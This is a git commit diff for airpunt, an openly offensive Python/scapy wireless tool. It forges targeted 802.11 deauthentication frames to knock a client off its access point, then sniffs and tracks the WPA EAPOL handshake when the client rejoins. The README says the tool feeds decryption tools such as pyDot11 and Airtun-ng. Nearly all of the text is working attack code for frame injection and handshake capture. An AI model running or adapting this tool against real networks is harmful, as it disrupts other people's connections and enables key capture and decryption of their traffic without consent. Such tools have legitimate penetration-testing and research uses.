fe209f2a03ca16d1c9745633a555c7cf3bd3ae7d
stryngs <support@configitnow.com>
2023-08-12 17:55:12 -0400

    Summercamp 2023 release

--- README.md
+++ README.md
@@ -1,21 +1,17 @@
 # airpunt
 airpunt deauthenticates a given target MAC address and then tracks the associated handshake when the MAC address rejoins the wireless network.
 
-airpunt is a tool aimed at assisting the user in viewing a given wireless scenario through a decryption tool such as [pyDot11](https://github.com/stryngs/pyDot11) or [Airtun-ng](https://www.aircrack-ng.org/doku.php?id=airtun-ng), but in a sane manner so that after the initial deauthentication, subsequent deauthentications are only sent if there is a new handshake that was somehow missed.
+airpunt is a tool aimed at assisting the user in viewing a given wireless scenario through a decryption tool such as [pyDot11](https://github.com/stryngs/pyDot11) or [Airtun-ng](https://www.aircrack-ng.org/doku.php?id=airtun-ng), but in a sane manner so that after the initial handshake capture, subsequent deauthentications are not sent.
 
 ## Setup
-```
-git clone https://github.com/stryngs/packetEssentials
-git clone https://github.com/stryngs/pyDot11
-python3 -m pip install pbkdf2
-python3 -m pip install pycryptodomex
-python3 -m pip install rc4
-python3 -m pip install scapy
-python3 -m pip install pyDot11/RESOURCEs/pyDot11*
-python3 -m pip install packetEssentials/RESOURCEs/packetEssentials*
-```
+````bash
+python3 -m venv env
+source env/bin/activate
+python3 -m pip install RESOURCEs/packetEssentials-2.0.tar.gz
+python3 -m pip install RESOURCEs/scapy-2.5.0.tar.gz
+````
 
 ## Usage
-```
+````bash
 python3 ./airpunt.py -b aa:bb:cc:dd:ee:ff -i wlan0 -t 11:22:33:44:55:66
-```
+````
--- airpunt.py
+++ airpunt.py
@@ -1,112 +1,132 @@
 #!/usr/bin/python3
 
 import argparse
-import pyDot11 as p11
+import packetEssentials as PE
 import sys
 import time
+from scapy.config import conf
 from scapy.sendrecv import sendp, sniff
 from scapy.packet import Raw
-from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
+from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11FCS
 from scapy.layers.eap import EAPOL
+from scapy.sendrecv import __gen_send as gs
 from scapy.utils import hexstr
 
 ### Next update will just use the Handshake() class from pyDot11
+### Add a threaded queue
+### If we thread, we won't be able to use a single pipe?
 class Handshake(object):
     """Deal with any type of EAPOL traffic"""
-
-    def __init__(self):
-        self.p = p11.pt
-        self.availTgts = set()
+    __slots__ = ('p', 'capTgts', 'catchDict', 'timer', 'haveShake')
+    def __init__(self, args):
+        self.p = PE.pt
+        self.capTgts = set()
         self.catchDict = {}
         self.timer = {}
-        self.delta = {}
         self.haveShake = set()
+
 
     def eapolGrab(self, pkt):
         """Notate and track gathered EAPOLs"""
-        eNum = self.p.nonceDict.get(self.p.byteRip(pkt[Raw], qty = 3)[6:])
-        if eNum[1] == '1' or eNum[1] == '2' or eNum[1] == '3':
-            # nonce = hexstr(str(pkt.load), onlyhex = 1)[39:134]
-            # hexPkt = hexstr(str(pkt), onlyhex = 1)
-            nonce = hexstr(pkt.load, onlyhex = 1)[39:134]
-            hexPkt = hexstr(pkt, onlyhex = 1)
+        try:
+            eNum = self.p.nonceDict.get(self.p.byteRip(pkt.lastlayer(), qty = 3)[6:])
+        except:
+            pass
+        if eNum is not None:
+            if eNum[1] == '1' or eNum[1] == '2' or eNum[1] == '3':
+                nonce = hexstr(pkt.load, onlyhex = 1)[39:134]
+                hexPkt = hexstr(pkt, onlyhex = 1)
 
-            ### Discard EAPOL 4 of 4
-            if nonce != '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00':
-                vMAC = ''
+                ### Discard EAPOL 4 of 4
+                if nonce != '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00':
+                    vMAC = ''
 
-                ## FROM-DS
-                if eNum == 'a1' or eNum == 'a3' or eNum == 't1' or eNum == 't3':
-                    vMAC = pkt[Dot11].addr1
-                    bMAC = pkt[Dot11].addr2
+                    ## FROM-DS
+                    if eNum == 'a1' or eNum == 'a3' or eNum == 't1' or eNum == 't3':
+                        vMAC = pkt[Dot11].addr1
+                        bMAC = pkt[Dot11].addr2
 
-                ## TO-DS
-                if eNum == 'a2' or eNum == 't2':
-                    vMAC = pkt[Dot11].addr2
-                    bMAC = pkt[Dot11].addr1
+                    ## TO-DS
+                    if eNum == 'a2' or eNum == 't2':
+                        vMAC = pkt[Dot11].addr2
+                        bMAC = pkt[Dot11].addr1
 
-                ## Deal with vMAC not in catchDict
-                if vMAC not in self.catchDict:
-                    if eNum[1] == '1':
-                        anonce = True
-                        snonce = False
+                    ## Deal with vMAC not in catchDict
+                    if vMAC not in self.catchDict:
+                        if eNum[1] == '1':
+                            anonce = True
+                            snonce = False
 
-                    elif eNum[1] == '2':
-                        anonce = False
-                        snonce = True
+                        elif eNum[1] == '2':
+                            anonce = False
+                            snonce = True
 
-                    elif eNum[1] == '3':
-                        anonce = True
-                        snonce = False
-                    self.catchDict.update({vMAC: (anonce, snonce)})
+                        elif eNum[1] == '3':
+                            anonce = True
+                            snonce = False
+                        self.catchDict.update({vMAC: (anonce, snonce)})
 
-                ## Deal with vMAC in catchDict
-                else:
+                    ## Deal with vMAC in catchDict
+                    else:
 
-                    ## Grab current anonce/snonce status
-                    storedAnonce, storedSnonce = self.catchDict.get(vMAC)
+                        ## Grab current anonce/snonce status
+                        storedAnonce, storedSnonce = self.catchDict.get(vMAC)
 
-                    ## Decide how to update
-                    if eNum[1] == '1':
-                        anonce = True
-                        snonce = False
+                        ## Decide how to update
+                        if eNum[1] == '1':
+                            anonce = True
+                            snonce = False
 
-                    elif eNum[1] == '2':
-                        anonce = False
-                        snonce = True
+                        elif eNum[1] == '2':
+                            anonce = False
+                            snonce = True
 
-                    elif eNum[1] == '3':
-                        anonce = True
-                        snonce = False
+                        elif eNum[1] == '3':
+                            anonce = True
+                            snonce = False
 
-                    ## Deal with anonce
-                    if anonce:
-                        self.catchDict.update({vMAC: (True, storedSnonce)})
-                    if snonce:
-                        self.catchDict.update({vMAC: (storedAnonce, True)})
+                        ## Deal with anonce
+                        if anonce:
+                            self.catchDict.update({vMAC: (True, storedSnonce)})
+                        if snonce:
+                            self.catchDict.update({vMAC: (storedAnonce, True)})
 
-                ## Check for anonce and snonce for the given vMAC
-                if self.catchDict.get(vMAC)[0] and self.catchDict.get(vMAC)[1]:
+                    ## Check for anonce and snonce for the given vMAC
+                    if self.catchDict.get(vMAC)[0] and self.catchDict.get(vMAC)[1]:
 
-                    ## Add vMAC to list of available targets
-                    self.availTgts.add(vMAC)
+                        ## Add vMAC to list of available targets
+                        self.capTgts.add(vMAC)
 
-                    ## Print our results thus far
-                    print('Our catchDict:\n{0}\n'.format(self.catchDict))
+                        ## Print our results thus far
+                        print('Our catchDict:\n{0}\n'.format(self.catchDict))
+
+def lFilter(args):
+    def snarf(pkt):
+        if pkt.haslayer(Dot11):
+            if pkt[Dot11].addr1 == args.b or pkt[Dot11].addr2 == args.b:
+                return True
+    return snarf
+
+def lFilterT(args):
+    def snarf(pkt):
+        if pkt.haslayer(Dot11):
+            if (pkt[Dot11].addr1 == args.b and pkt[Dot11].addr2 == args.t) or (pkt[Dot11].addr2 == args.b and pkt[Dot11].addr1 == args.t):
+                return True
+    return snarf
 
 
 def tBuild(bssid, tgt):
     """Build a targeted deauth"""
     return RadioTap()/Dot11(addr1 = bssid,
-                            addr2= tgt,
+                            addr2 = tgt,
                             addr3 = bssid)/Dot11Deauth(reason = 1)
 
 
 def bBuild(bssid):
     """Build a broadcast deauth
     Not used in airpunt, but left for demonstrational purposes"""
-    return RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',
-                            addr2= bssid,
+    return RadioTap()/Dot11(addr1 = 'ff:ff:ff:ff:ff:ff',
+                            addr2 = bssid,
                             addr3 = bssid)/Dot11Deauth(reason = 1)
 
 
@@ -114,29 +134,31 @@ def packetParser(args, shake):
     def engine(packet):
         tMAC = None
         bssid = None
-        tStamp = time.time()
 
         ## Deal with handshakes
-        # if packet.haslayer(EAPOL):
-        #     print(packet.summary())
         if packet.haslayer(EAPOL):
             shake.eapolGrab(packet)
 
-        ## Verify we're only caring about data frames and From-DS
-        elif packet[Dot11].type == 2 and packet[Dot11].FCfield == 66:
-
-            ## Reasons for deAuth
-            if not packet.addr1 in shake.availTgts:
-                bssid = packet.addr2
-                tMAC = packet.addr1
-
-        ## Verify we're only caring about data frames and To-DS
-        elif packet[Dot11].type == 2 and packet[Dot11].FCfield == 65:
-
-            ## Reasons for deAuth
-            if not packet.addr2 in shake.availTgts:
-                bssid = packet.addr1
-                tMAC = packet.addr2
+        elif packet[Dot11].type == 2:
+            toDS = None
+            fromDS = None
+            if 'to-DS' in packet[Dot11].FCfield:
+                toDS = True
+            if 'from-DS' in packet[Dot11].FCfield:
+                fromDS = True
+            if toDS is not None and fromDS is not None:
+                pass
+            else:
+                if fromDS is True:
+                    if not packet.addr1 in shake.capTgts:
+                        bssid = packet.addr2
+                        tMAC = packet.addr1
+                elif toDS is True:
+                    if not packet.addr2 in shake.capTgts:
+                        bssid = packet.addr1
+                        tMAC = packet.addr2
+        else:
+            return
 
         ## Time for deAuth logic
         if bssid and tMAC:
@@ -145,39 +167,28 @@ def packetParser(args, shake):
             if tMAC != 'ff:ff:ff:ff:ff:ff':
 
                 ## Check to see if there exists an original timestamp
-                if not tMAC in shake.timer:
-                    shake.timer.update({tMAC: tStamp})
-                    shake.delta.update({tMAC: tStamp})
-
-                    ### DEBUG ~~> verbosity
-                    pkt = tBuild(bssid, tMAC)
-                    print(pkt.summary())
-                    sendp(pkt, iface = args.i, verbose = 0)
-                    # sendp(tBuild(bssid, tMAC), iface = args.i, verbose = 0)
-
-                    print('Deauth sent for: {0}'.format(tMAC))
-                else:
-                    shake.delta.update({tMAC: tStamp})
-                    #print 'new time: %s -- %s' % (tMAC, tStamp)
-
-                    ## Check the deltas
-                    old = shake.timer.get(tMAC)
-                    new = shake.delta.get(tMAC)
-
-                    ## Push the deauth
-                    if new - old >= args.s:
-
-                        ### DEBUG ~~> verbosity
-                        pkt = tBuild(bssid, tMAC)
-                        print(pkt.summary())
-                        sendp(pkt, iface = args.i, verbose = 0)
-                        # sendp(tBuild(bssid, tMAC), iface = args.i, verbose = 0)
+                tStamp = time.time()
+                try:
+                    if not tMAC in shake.timer:
+                        shake.timer.update({tMAC: tStamp})
+                        gs(injSocket, tBuild(bssid, tMAC), verbose = 0)
                         print('Deauth sent for: {0}'.format(tMAC))
+
+                    else:
+                        ## Push the deauth
+                        if tStamp - shake.timer.get(tMAC) >= args.s:
+                            gs(injSocket, tBuild(bssid, tMAC), verbose = 0)
+                            print('Deauth sent for: {0}'.format(tMAC))
+
+                        ## Update times
+                        shake.timer.update({tMAC: tStamp})
+                except Exception as E:
+                    print(E)
     return engine
 
 
 def main(args):
-    shake = Handshake()
+    shake = Handshake(args)
     if not args.s:
         args.s = 3
     else:
@@ -189,17 +200,19 @@ def main(args):
 
     ## Any client
     if not args.t:
+        LFILTER = lFilter(args)
         sniff(iface = args.i,
               prn = pHandler,
               store = 0,
-              lfilter = lambda x: x[Dot11].addr1 == args.b or x[Dot11].addr2 == args.b)
+              lfilter = LFILTER)
 
     ## Tgt client only
     else:
+        LFILTER = lFilterT(args)
         sniff(iface = args.i,
-                    prn = pHandler,
-                    store = 0,
-                    lfilter = lambda x: (x[Dot11].addr1 == args.b and x[Dot11].addr2 == args.t) or (x[Dot11].addr2 == args.b and x[Dot11].addr1 == args.t))
+              prn = pHandler,
+              store = 0,
+              lfilter = LFILTER)
 
 
 if __name__ == '__main__':
@@ -219,4 +232,5 @@ if __name__ == '__main__':
                         metavar = '<tgt MAC>',
                         help = 'Target MAC ------------------------ optional')
     args = parser.parse_args()
+    injSocket = conf.L2socket(iface = args.i)
     main(args)
